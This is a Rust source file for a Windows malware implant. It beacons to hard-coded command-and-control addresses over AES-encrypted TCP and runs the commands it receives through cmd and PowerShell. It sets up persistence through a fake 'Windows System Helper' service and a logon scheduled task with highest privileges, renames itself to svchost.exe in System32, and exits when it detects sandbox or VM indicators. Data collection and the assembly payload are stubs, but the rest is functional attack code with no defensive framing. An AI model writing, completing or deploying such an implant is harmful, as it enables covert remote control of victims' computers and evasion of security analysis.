use std::{env, process::Command, time::Duration};
use rand::Rng;
use tokio::{net::TcpStream, time::sleep};
use log::{info, error};
use simple_logger::SimpleLogger;
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use tokio::fs;
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::error::Error;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const MAIN_C2: &str = "192.168.1.186:2222";
const FALLBACK_C2: &str = "192.168.122.1:2222";
const AES_KEY: &[u8; 32] = b"anexampleverysecureencryptionkey";
const AES_IV: &[u8; 16] = b"uiqueinitvector!";

#[tokio::main]
async fn main() {
    SimpleLogger::new().init().unwrap();

    if let Err(e) = setup_environment().await {
        error!("Failed to set up environment: {}", e);
        return;
    }
    start_beaconing().await;
}

async fn setup_environment() -> Result<(), Box<dyn std::error::Error>> {
    masquerade_as_system_service().await?;
    setup_persistence()?;
    run_anti_analysis_checks()?;
    Ok(())
}

async fn start_beaconing() {
    let mut rng = rand::thread_rng();
    let mut c2_address = MAIN_C2;

    loop {
        let delay = rng.gen_range(60..180);
        if let Err(e) = beacon_to_c2(c2_address).await {
            error!("Error in beaconing: {}", e);
            c2_address = if c2_address == MAIN_C2 { FALLBACK_C2 } else { MAIN_C2 };
        }
        sleep(Duration::from_secs(delay)).await;
    }
}

async fn beacon_to_c2(c2_address: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut stream = TcpStream::connect(c2_address).await?;
    let data = collect_data().await;
    let encrypted_data = encrypt_data(&data)?;

    stream.write_all(&encrypted_data).await?;
    info!("Beacon sent to C2.");

    let mut response = vec![0; 1024];
    let size = stream.read(&mut response).await?;
    if size > 0 {
        let command = decrypt_data(&response[..size])?;
        dispatch_command(&command).await?;
    }
    Ok(())
}

async fn collect_data() -> Vec<u8> {
    vec![] // Placeholder for collected data
}

async fn dispatch_command(command: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let cmd_str = String::from_utf8_lossy(command).to_string();
    info!("Received command: {}", cmd_str);

    if cmd_str.starts_with("asm ") {
        execute_asm_payload().await?;
    } else if cmd_str.starts_with("powershell ") {
        execute_powershell_in_memory(&cmd_str[10..]).await?;
    } else {
        execute_command(&cmd_str).await?;
    }
    Ok(())
}

async fn execute_command(command: &str) -> Result<(), Box<dyn std::error::Error>> {
    let output = Command::new("cmd")
        .arg("/C")
        .arg(command)
        .output()?;

    if !output.stdout.is_empty() {
        info!("Command output: {:?}", String::from_utf8_lossy(&output.stdout));
    }
    if !output.stderr.is_empty() {
        error!("Command error: {:?}", String::from_utf8_lossy(&output.stderr));
    }
    Ok(())
}

async fn execute_asm_payload() -> Result<(), std::io::Error> {
    info!("Executing in-memory ASM payload...");
    Ok(())
}

async fn execute_powershell_in_memory(script: &str) -> Result<(), std::io::Error> {
    Command::new("powershell")
        .arg("-Command")
        .arg(script)
        .spawn()?;
    Ok(())
}

fn encrypt_data(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let cipher = Aes256Cbc::new_from_slices(AES_KEY, AES_IV)?;
    Ok(cipher.encrypt_vec(data))
}

fn decrypt_data(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let cipher = Aes256Cbc::new_from_slices(AES_KEY, AES_IV)?;
    cipher.decrypt_vec(data).map_err(|e| e.into())
}

fn setup_persistence() -> Result<(), Box<dyn std::error::Error>> {
    let executable_path = env::current_exe()?;
    let service_name = "WindowsSystemHelper";

    Command::new("sc")
        .arg("create")
        .arg(service_name)
        .arg("binPath=")
        .arg(format!("{}", executable_path.display()))
        .arg("DisplayName=")
        .arg("Windows System Helper Service")
        .arg("start=")
        .arg("auto")
        .output()?;

    Command::new("sc")
        .arg("start")
        .arg(service_name)
        .output()?;
    
    Command::new("cmd")
        .arg("/C")
        .arg(format!("schtasks /create /tn \"WindowsSysTask\" /tr \"{}\" /sc onlogon /rl highest", executable_path.display()))
        .output()?;
    
    Ok(())
}

async fn masquerade_as_system_service() -> Result<(), Box<dyn std::error::Error>> {
    let new_name = "svchost.exe";
    let system32_path = env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".to_string()) + "\\System32";
    let new_path = format!("{}\\{}", system32_path, new_name);

    fs::rename(env::current_exe()?, &new_path).await.map_err(|_| { 
        error!("Masquerading as system service failed.");
        std::io::Error::new(std::io::ErrorKind::Other, "Masquerade failed")
    })?;
    
    info!("Masquerading as {}", new_name);
    Ok(())
}

fn run_anti_analysis_checks() -> Result<(), std::io::Error> {
    let analysis_indicators = ["sandbox", "vbox", "debug", "vmware"];
    for indicator in &analysis_indicators {
        if env::var(indicator).is_ok() {
            error!("Analysis environment detected. Exiting.");
            std::process::exit(1);
        }
    }
    Ok(())
}

